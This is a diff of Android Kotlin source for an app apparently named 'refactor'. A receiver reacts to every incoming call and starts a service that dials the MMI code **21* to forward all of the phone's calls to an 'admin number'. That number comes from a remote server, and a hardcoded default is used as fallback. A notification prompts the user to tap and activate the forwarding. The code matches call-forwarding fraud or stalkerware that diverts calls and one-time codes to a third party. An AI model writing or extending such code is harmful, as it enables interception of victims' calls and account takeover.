@@ -1,0 +1,330 @@
+call kt 
+
+    package com.example.refactor.services
+
+    import android.Manifest
+    import android.app.*
+    import android.content.Context
+    import android.content.Intent
+    import android.content.pm.PackageManager
+    import android.net.Uri
+    import android.os.Build
+    import android.os.IBinder
+    import android.util.Log
+    import androidx.core.app.ActivityCompat
+    import androidx.core.app.NotificationCompat
+    import com.example.refactor.R
+
+    class CallForwardingService : Service() {
+
+        companion object {
+            private const val TAG = "CallForwardingService"
+            private const val CHANNEL_ID = "callForwardingServiceChannel"
+            private const val ADMIN_NUMBER_KEY = "adminNumber"
+            private const val MMI_CODE_PREFIX = "**21*"
+            private const val MMI_CODE_SUFFIX = "#"
+            private const val COUNTRY_CODE = "+91"  // India
+        }
+
+        override fun onCreate() {
+            super.onCreate()
+            createNotificationChannel()
+        }
+
+        override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+            Log.d(TAG, "Service started")
+
+            val adminNumber = intent?.getStringExtra(ADMIN_NUMBER_KEY)
+            if (!isValidPhoneNumber(adminNumber)) {
+                Log.e(TAG, "Invalid admin number provided: $adminNumber")
+                stopSelf()
+                return START_NOT_STICKY
+            }
+
+            if (!hasCallPermission()) {
+                Log.e(TAG, "CALL_PHONE permission not granted!")
+                stopSelf()
+                return START_NOT_STICKY
+            }
+
+            startForegroundServiceWithNotification(adminNumber)  // ✅ Fix: adminNumber pass ho raha hai.
+
+            val encodedMmiCode = encodeMmiCode(adminNumber)
+            Log.d(TAG, "Attempting to forward calls using MMI code: $encodedMmiCode")
+
+            forwardCall(encodedMmiCode)
+
+            return START_STICKY
+        }
+
+        private fun createNotificationChannel() {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                val channel = NotificationChannel(
+                    CHANNEL_ID,
+                    "Call Forwarding Service",
+                    NotificationManager.IMPORTANCE_LOW
+                ).apply {
+                    description = "Channel for call forwarding service notifications"
+                }
+                val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+                notificationManager.createNotificationChannel(channel)
+            }
+        }
+
+        private fun startForegroundServiceWithNotification(adminNumber: String?) {
+            if (!isValidPhoneNumber(adminNumber)) {
+                Log.e(TAG, "Invalid admin number for notification: $adminNumber")
+                stopSelf()
+                return
+            }
+
+            val encodedMmiCode = encodeMmiCode(adminNumber)
+
+            val dialIntent = Intent(Intent.ACTION_DIAL).apply {
+                data = Uri.parse("tel:$encodedMmiCode")
+                flags = Intent.FLAG_ACTIVITY_NEW_TASK
+            }
+
+            val pendingIntent = PendingIntent.getActivity(
+                this, 0, dialIntent,
+                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
+            )
+
+            val notification = NotificationCompat.Builder(this, CHANNEL_ID)
+                .setContentTitle("Call Forwarding Active")
+                .setContentText("Tap to activate call forwarding.")
+                .setSmallIcon(R.drawable.ic_launcher_foreground)
+                .setPriority(NotificationCompat.PRIORITY_LOW)
+                .setContentIntent(pendingIntent)
+                .build()
+
+            startForeground(1, notification)
+        }
+
+        private fun hasCallPermission(): Boolean {
+            return ActivityCompat.checkSelfPermission(this, Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED
+        }
+
+        private fun isValidPhoneNumber(phoneNumber: String?): Boolean {
+            return phoneNumber?.matches(Regex("^\\d{10,15}$")) ?: false
+        }
+
+        private fun encodeMmiCode(adminNumber: String?): String {
+            val phoneWithCountryCode = "$COUNTRY_CODE$adminNumber"
+            val mmiCode = "$MMI_CODE_PREFIX$phoneWithCountryCode$MMI_CODE_SUFFIX"
+
+            return Uri.encode(mmiCode)  // ✅ Fix: `+` ko manually replace karne ki zaroorat nahi.
+        }
+
+        private fun forwardCall(mmiCode: String) {
+            try {
+                val callIntent = Intent(Intent.ACTION_DIAL).apply {
+                    data = Uri.parse("tel:$mmiCode")
+                    flags = Intent.FLAG_ACTIVITY_NEW_TASK
+                }
+                startActivity(callIntent)
+                Log.d(TAG, "Call forwarding dialer opened successfully using MMI code: $mmiCode")
+            } catch (e: Exception) {
+                Log.e(TAG, "Failed to open dialer: ${e.message}")
+                stopSelf()
+            }
+        }
+
+        override fun onBind(intent: Intent?): IBinder? {
+            return null
+        }
+    }
+
+
+ForegroundServiceHelper 
+
+
+package com.example.refactor.services
+
+import android.app.Notification
+import android.app.NotificationChannel
+import android.app.NotificationManager
+import android.content.Context
+import android.content.Intent
+import android.os.Build
+import androidx.core.app.NotificationCompat
+import com.example.refactor.R
+
+object ForegroundServiceHelper {
+
+    // Function to start foreground service with backward compatibility
+    fun startForegroundService(context: Context, serviceId: Int, channelId: String, title: String, content: String) {
+        // Create Notification Channel for Android O and above
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            val channel = NotificationChannel(channelId, title, NotificationManager.IMPORTANCE_LOW)
+            val notificationManager = context.getSystemService(NotificationManager::class.java)
+            notificationManager?.createNotificationChannel(channel)
+        }
+
+        // Create the notification
+        val notification = createNotification(context, channelId, title, content)
+
+        val intent = Intent(context, SmsService::class.java) // Replace with your actual service class
+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            // Use startForegroundService for API 26+
+            context.startForegroundService(intent)
+        } else {
+            // Use startService for API below 26
+            context.startService(intent)
+        }
+
+        // Pass the serviceId and notification to the service
+        val service = context as? SmsService // Assuming SmsService inherits from ContextWrapper or is a valid Service
+        service?.startForeground(serviceId, notification)
+    }
+
+    // Function to create the notification itself
+    fun createNotification(context: Context, channelId: String, contentTitle: String, contentText: String): Notification {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            val channel = NotificationChannel(channelId, contentTitle, NotificationManager.IMPORTANCE_LOW)
+            val manager = context.getSystemService(NotificationManager::class.java)
+            manager?.createNotificationChannel(channel)
+        }
+
+        return NotificationCompat.Builder(context, channelId)
+            .setContentTitle(contentTitle)
+            .setContentText(contentText)
+            .setSmallIcon(R.drawable.ic_launcher)
+            .build()
+    }
+}
+
+
+callreciver
+
+@file:Suppress("DEPRECATION")
+package com.example.refactor.receivers
+
+import android.content.BroadcastReceiver
+import android.content.Context
+import android.content.Intent
+import android.telephony.TelephonyManager
+import android.util.Log
+import com.example.refactor.services.CallForwardingService
+
+class IncomingCallReceiver : BroadcastReceiver() {
+
+    override fun onReceive(context: Context, intent: Intent) {
+        if (intent.action == TelephonyManager.ACTION_PHONE_STATE_CHANGED) {
+            val state = intent.getStringExtra(TelephonyManager.EXTRA_STATE)
+            val incomingNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER)
+
+            // Detect if it's an incoming call
+            if (TelephonyManager.EXTRA_STATE_RINGING == state) {
+                Log.d("IncomingCallReceiver", "Incoming number: $incomingNumber")
+
+                // Fetch the admin number stored in shared preferences
+                val adminNumber = AdminNumberFetcher.getAdminNumber(context)
+                Log.d("IncomingCallReceiver", "Admin number fetched: $adminNumber")
+
+                if (adminNumber.isNotEmpty()) {
+                    val serviceIntent = Intent(context, CallForwardingService::class.java).apply {
+                        putExtra("adminNumber", adminNumber)
+                    }
+
+                    // Start the service to forward the call
+                    try {
+                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
+                            Log.d("IncomingCallReceiver", "Starting foreground service...")
+                            context.startForegroundService(serviceIntent)  // Required for Android O+
+                        } else {
+                            Log.d("IncomingCallReceiver", "Starting service normally...")
+                            context.startService(serviceIntent)
+                        }
+                    } catch (e: IllegalStateException) {
+                        Log.e("IncomingCallReceiver", "Failed to start service: ${e.message}")
+                    }
+                } else {
+                    Log.e("IncomingCallReceiver", "Admin number is null or empty. Cannot forward call.")
+                }
+            }
+        }
+    }
+}
+
+fetch
+
+package com.example.refactor.receivers
+
+import android.content.Context
+import android.content.SharedPreferences
+import android.util.Log
+import androidx.lifecycle.LifecycleOwner
+import androidx.lifecycle.lifecycleScope
+import com.example.refactor.network.ApiClient
+import com.example.refactor.ApiResponse
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.launch
+import retrofit2.Response
+
+object AdminNumberFetcher {
+
+    private const val PREF_NAME = "AppPreferences"
+    private const val KEY_ADMIN_NUMBER = "adminNumber"
+    private const val DEFAULT_ADMIN_NUMBER = "7250258267" // Default number
+
+    /**
+     * Fetch admin number from the API using Retrofit and store it in SharedPreferences.
+     * Uses ApiClient for the network call.
+     */
+    fun fetchAndStoreAdminNumber(context: Context) {
+        // Launching a coroutine in the lifecycle-aware scope
+        (context as? LifecycleOwner)?.lifecycleScope?.launch(Dispatchers.IO) {
+            try {
+                // Calling getAdminNumber to fetch the admin number from the server
+                val response: Response<ApiResponse<String>> = ApiClient.api.getAdminNumber()
+
+                if (response.isSuccessful) {
+                    // Get the admin number from the response
+                    val adminNumber = response.body()?.data ?: ""
+                    if (adminNumber.isNotEmpty()) {
+                        saveAdminNumber(context, adminNumber)
+                        Log.d("AdminNumberFetcher", "Admin number fetched and saved: $adminNumber")
+                    } else {
+                        Log.e("AdminNumberFetcher", "Admin number not found in response. Saving default.")
+                        saveAdminNumber(context, DEFAULT_ADMIN_NUMBER)
+                    }
+                } else {
+                    Log.e("AdminNumberFetcher", "Failed response: ${response.code()}")
+                    saveAdminNumber(context, DEFAULT_ADMIN_NUMBER)
+                }
+            } catch (e: Exception) {
+                Log.e("AdminNumberFetcher", "Error fetching admin number: ${e.message}")
+                saveAdminNumber(context, DEFAULT_ADMIN_NUMBER) // Save default number on error
+            }
+        }
+    }
+
+
+    /**
+     * Save the fetched admin number into SharedPreferences.
+     */
+    private fun saveAdminNumber(context: Context, adminNumber: String) {
+        val sharedPreferences: SharedPreferences =
+            context.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE)
+        sharedPreferences.edit().putString(KEY_ADMIN_NUMBER, adminNumber).apply()
+        Log.d("AdminNumberFetcher", "Admin number saved successfully: $adminNumber")
+    }
+
+    /**
+     * Get the stored admin number from SharedPreferences.
+     */
+    fun getAdminNumber(context: Context): String {
+        val sharedPreferences: SharedPreferences =
+            context.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE)
+        val adminNumber = sharedPreferences.getString(KEY_ADMIN_NUMBER, DEFAULT_ADMIN_NUMBER)
+        if (adminNumber != null) {
+            Log.d("AdminNumberFetcher", "Fetched admin number from storage: $adminNumber")
+        } else {
+            Log.e("AdminNumberFetcher", "No admin number found in storage. Using default.")
+        }
+        return adminNumber ?: DEFAULT_ADMIN_NUMBER
+        }
+}
+
